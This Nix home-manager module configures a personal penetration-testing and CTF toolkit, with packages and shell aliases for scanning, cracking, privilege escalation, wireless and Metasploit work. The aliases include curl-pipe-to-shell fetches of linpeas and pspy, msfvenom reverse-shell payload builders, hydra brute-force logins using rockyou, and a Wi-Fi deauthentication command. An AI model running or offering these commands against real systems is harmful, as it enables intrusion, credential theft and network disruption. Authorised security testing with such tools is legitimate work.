# Security / CTF toolkit — user-level profile, imported only on ghost & titan
# (see home-manager/stefan-hacks/default.nix). Absorbs .bash_aliases sections
# 16–26, with nixpkgs-verified package names and store-resolved wordlists.
#
# Renames vs the old aliases:
#   crackmapexec-smb -> nxc (netexec; crackmapexec was removed from nixpkgs)
#   smb-enum         -> enum4linux-ng (binary name)
#   airgeddon        -> airgeddon (airgeddon is a proper package; no /usr/share path)
# Dropped: gtfoblookup aliases (gtfoblookup/gtfobins are not in nixpkgs).
{ pkgs, ... }:

let
  # Store-resolved wordlist locations (values verified against built packages).
  dirb-wl = "${pkgs.dirb}/share/wordlists/dirb";
  sl = "${pkgs.seclists}/share/wordlists/seclists"; # do NOT name this `seclists` (shadows the package)
  # nixpkgs' onesixtyone ships no dict; seclists has the onesixtyone-tailored list.
  snmp-wl = "${sl}/Discovery/SNMP/common-snmp-community-strings-onesixtyone.txt";
  users-wl = "${sl}/Usernames/top-usernames-shortlist.txt";
  # rockyou ships ONLY as rockyou.txt.tar.gz in seclists — extract on first use.
  rockyou-tgz = "${sl}/Passwords/Leaked-Databases/rockyou.txt.tar.gz";
  rockyou-extract = ''[ -f /tmp/rockyou.txt ] || tar -xzf ${rockyou-tgz} -C /tmp'';
in
{
  home.packages = with pkgs; [
    # Enumeration
    netdiscover
    arp-scan
    enum4linux-ng
    smbmap
    netexec
    dnsenum
    dnsrecon
    onesixtyone
    snmpcheck
    rpcbind # rpcinfo -p
    netcat

    # Web application testing
    gobuster
    nikto
    wfuzz
    sqlmap
    ffuf
    dirb # wordlists referenced in aliases

    # Password attacks
    john
    hashcat
    thc-hydra
    hashid
    hash-identifier
    seclists # rockyou.txt & friends — store-resolved above

    # Privilege escalation / recon helpers
    metasploit
    exploitdb

    # Wireless (monitor-capable hardware required)
    aircrack-ng
    airgeddon

    # Tunnelling / proxy
    chisel
    proxychains-ng
    tor

    # File analysis & steganography
    steghide
    binwalk
    foremost

    # Misc referenced by aliases
    libxslt # xsltproc for nmap xml→html
    python3Packages.impacket # smbserver.py
    python3Packages.pyftpdlib # ftp-server alias
    hddtemp
    asciinema
  ];

  programs.bash.shellAliases = {
    # ── 16. Enumeration ─────────────────────────────────────────────────
    nmap-fast = "nmap -F -T5 --open";
    nmap-full = "nmap -sS -sU -T4 -A -v -PE -PP -PS80,443 -PA3389 -PU40125 -PY -g 53";
    nmap-os = "sudo nmap -O --osscan-guess";
    nmap-ping = "nmap -sn";
    nmap-vuln = "sudo nmap --script vuln";
    nmap-smb = "nmap -p 445 --script=smb-enum-shares,smb-enum-users,smb-vuln-ms17-010";
    nmap-http = "nmap -p 80,443,8080,8443 --script=http-enum,http-title";
    nmap2xml = "sudo nmap -sS -T4 -A -sC -oX nmap.xml";
    xml2html = "xsltproc -o nmap.html nmap-bootstrap.xsl nmap.xml";
    nmap-top = "nmap --top-ports 1000 -T4 -v";

    smb-enum = "enum4linux-ng -a";
    smb-client = "smbclient -L";
    smb-map = "smbmap -H";
    crackmapexec-smb = "nxc smb"; # crackmapexec was renamed netexec (binary: nxc)
    nxc-smb = "nxc smb";

    dns-enum = "dnsenum --enum";
    dnsrecon-scan = "dnsrecon -d";
    dig-all = "dig any";
    dig-axfr = "dig axfr";

    snmp-check = "snmp-check";
    snmp-walk = "snmpwalk -c public -v1";
    onesixtyone-scan = "onesixtyone -c ${snmp-wl}";

    rpc-enum = "rpcinfo -p";
    ftp-anon = "ftp -n";
    smtp-test = "nc -nv";

    netdiscover-scan = "sudo netdiscover -r";
    arp-scan-local = "sudo arp-scan -l";
    # renamed: shadows the package binary `arp-scan`
    # (original: arp-scan='sudo arp-scan -l' — alias name == binary name is fragile)

    # ── 17. Web application testing ─────────────────────────────────────
    gobuster-dir = "gobuster dir -w ${dirb-wl}/common.txt -t 50";
    gobuster-vhost = "gobuster vhost -w ${dirb-wl}/common.txt -t 50";
    gobuster-dns = "gobuster dns -w ${dirb-wl}/common.txt -t 50";
    nikto-scan = "nikto -h";
    wfuzz-scan = "wfuzz -c -z file,${dirb-wl}/common.txt --hc 404";
    sqlmap-auto = "sqlmap --batch --random-agent --level=3";
    ffuf-scan = "ffuf -w ${dirb-wl}/common.txt -u";

    curl-headers = "curl -sI";
    curl-follow = "curl -sL";
    curl-time = ''curl -s -w "DNS: %{time_namelookup}s  Connect: %{time_connect}s  Total: %{time_total}s\n" -o /dev/null'';

    # ── 18. Password attacks ────────────────────────────────────────────
    john-basic = "john --format=raw-md5";
    john-show = "john --show";
    hashcat-md5 = "hashcat -m 0 -a 0";
    hashcat-sha1 = "hashcat -m 100 -a 0";
    hashcat-ntlm = "hashcat -m 1000 -a 0";
    hashcat-sha256 = "hashcat -m 1400 -a 0";
    rockyou = "${rockyou-extract}; john --wordlist=/tmp/rockyou.txt";
    hydra-ssh = "${rockyou-extract}; hydra -L ${users-wl} -P /tmp/rockyou.txt ssh://";
    hydra-http = "${rockyou-extract}; hydra -L users.txt -P /tmp/rockyou.txt http-post-form";

    hash-id = "hashid";
    hash-id2 = "hash-identifier";

    # ── 19. Privilege escalation ────────────────────────────────────────
    linpeas = "curl -sL https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh";
    winpeas = "curl -sL https://github.com/carlospolop/PEASS-ng/releases/latest/download/winPEAS.bat";
    pspy64 = "curl -sL https://github.com/DominicBreuker/pspy/releases/latest/download/pspy64 -o /tmp/pspy64 && chmod +x /tmp/pspy64 && /tmp/pspy64";
    suid-find = "find / -perm -u=s -type f 2>/dev/null";
    sgid-find = "find / -perm -g=s -type f 2>/dev/null";
    world-write = "find / -perm -o+w -type f 2>/dev/null";
    cap-find = "getcap -r / 2>/dev/null";
    sudo-list = "sudo -l";

    # ── 20. Wireless ────────────────────────────────────────────────────
    wifi-list = "nmcli dev wifi list";
    wifi-mon = "sudo airmon-ng start";
    airodump = "sudo airodump-ng -w capture --output-format pcap,csv -K 1";
    aireplay-deauth = "sudo aireplay-ng --deauth 10 -a";
    airgeddon-start = "sudo airgeddon";
    # renamed: original alias `airgeddon` equalled the binary name

    # ── 21. Metasploit ──────────────────────────────────────────────────
    msfconsole = "msfconsole -q";
    msfrpc = "msfrpcd -U msf -P password -f -S";
    msfvenom-list = "msfvenom -l";
    msfvenom-list-payloads = "msfvenom -l payloads";
    msfvenom-list-encoders = "msfvenom -l encoders";

    # ── 22. Payload generation ──────────────────────────────────────────
    msfvenom-exe = "msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST= LPORT= -f exe -o";
    msfvenom-elf = "msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST= LPORT= -f elf -o";
    msfvenom-apk = "msfvenom -p android/meterpreter/reverse_tcp LHOST= LPORT= -o";
    msfvenom-ps1 = "msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST= LPORT= -f psh -o";

    http-server = "python3 -m http.server 8080";
    ftp-server = "python3 -m pyftpdlib -p 2121 -w";
    smb-server = "smbserver.py -smb2support share ."; # python3Packages.impacket

    # ── 23. Port forwarding & tunnelling ────────────────────────────────
    ssh-local = "ssh -L";
    ssh-remote = "ssh -R";
    ssh-dynamic = "ssh -D 1080 -qCN";
    socat-listen = "socat TCP-LISTEN:";
    chisel-client = "chisel client";

    # ── 24. File analysis & steganography ───────────────────────────────
    file-check = "file";
    hexdump = "xxd";
    hexdump-less = "xxd | less";
    exif-all = "exiftool";
    steg-extract = "steghide extract -sf";
    binwalk-all = "binwalk -e";
    foremost-run = "foremost -i";

    # ── 25. Proxy & anonymity ───────────────────────────────────────────
    mproxy = "curl --proxy http://127.0.0.1:8080";
    start-tor = "sudo systemctl start tor";
    stop-tor = "sudo systemctl stop tor";
    check-tor = "curl --socks5-hostname 127.0.0.1:9050 https://check.torproject.org/api/ip";
    proxychains-quiet = "proxychains -q";

    # ── 26. Quick helpers ───────────────────────────────────────────────
    # rot13 lives in bash.nix (was duplicated in section 26).
    # caesar-brute / xor-byte functions live in bash.nix initExtra.
    trec = "asciinema rec";
    tplay = "asciinema play";
    cheat = "tldr";
    evidence = "mkdir -p ~/evidence && cd ~/evidence && ls -la";
    ydlp = ''yt-dlp -o "%(playlist)s/%(playlist_index)s - %(title)s.%(ext)s"'';
    ydlc = ''yt-dlp -o "%(uploader)s/%(playlist)s/%(playlist_index)s - %(title)s.%(ext)s"'';
    lload = "find /run/current-system/kernel-modules/lib/modules/$(uname -r) -type f -name '*.ko*'";
  };
}
